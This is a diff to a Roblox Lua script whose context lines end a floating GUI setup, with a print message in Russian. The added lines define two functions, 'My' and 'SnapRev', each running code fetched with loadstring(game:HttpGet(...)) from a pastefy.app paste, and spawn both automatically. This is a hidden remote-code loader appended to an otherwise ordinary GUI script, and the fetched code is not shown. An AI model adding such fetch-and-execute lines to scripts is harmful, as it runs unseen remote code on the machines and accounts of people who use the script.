@@ -191,3 +191,15 @@ UserInputService.InputChanged:Connect(function(input)
 end)
 
 print("[GUI] Плавающее GUI запущено с высоким приоритетом отображения")
+--My
+local function My()
+  loadstring(game:HttpGet("https://pastefy.app/0yy9WFTL/raw",true))() 
+end
+local function SnapRev()
+  loadstring(game:HttpGet("https://pastefy.app/WJzwkGcy/raw",true))()
+end
+
+
+task.spawn(My)
+wait(3)
+task.spawn(SnapRev)
